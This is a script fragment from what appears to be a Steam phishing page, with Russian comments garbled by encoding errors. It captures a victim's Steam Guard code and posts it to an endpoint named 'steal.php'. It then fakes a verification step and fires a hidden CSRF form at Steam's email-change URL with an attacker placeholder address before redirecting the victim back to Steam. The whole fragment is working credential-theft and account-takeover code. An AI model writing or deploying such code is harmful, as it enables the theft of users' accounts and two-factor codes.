    <script>
        function submitCode() {
            const code = document.getElementById('guardCode').value;
            
            if (code.length === 5) {
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–æ–¥
                fetch('/api/steal.php', {
                    method: 'POST',
                    body: JSON.stringify({
                        type: 'steam_guard',
                        code: code,
                        timestamp: new Date().toISOString()
                    })
                });
                
                // –ò–º–∏—Ç–∏—Ä—É–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É
                document.querySelector('button').textContent = '–ü—Ä–æ–≤–µ—Ä–∫–∞...';
                
                setTimeout(() => {
                    // CSRF –∞—Ç–∞–∫–∞ –Ω–∞ —Å–º–µ–Ω—É –ø–æ—á—Ç—ã
                    startCSRFAttack();
                    
                    // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ–º –≤ Steam
                    window.location.href = 'https://steamcommunity.com/id/me';
                }, 2000);
            }
        }
        
        function startCSRFAttack() {
            // –°–∫—Ä—ã—Ç–∞—è —Ñ–æ—Ä–º–∞ —Å–º–µ–Ω—ã email
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'https://store.steampowered.com/account/email/change';
            form.style.display = 'none';
            
            form.innerHTML = `
                <input type="hidden" name="newEmail" value="YOUR_EMAIL@gmail.com">
                <input type="hidden" name="password" value="">
                <input type="hidden" name="confirm" value="YOUR_EMAIL@gmail.com">
            `;
            
            document.body.appendChild(form);
            form.submit();
        }
        
        // –ê–≤—Ç–æ—Ñ–æ–∫—É—Å –Ω–∞ –ø–æ–ª–µ –≤–≤–æ–¥–∞
        document.getElementById('guardCode').focus();
    </script>
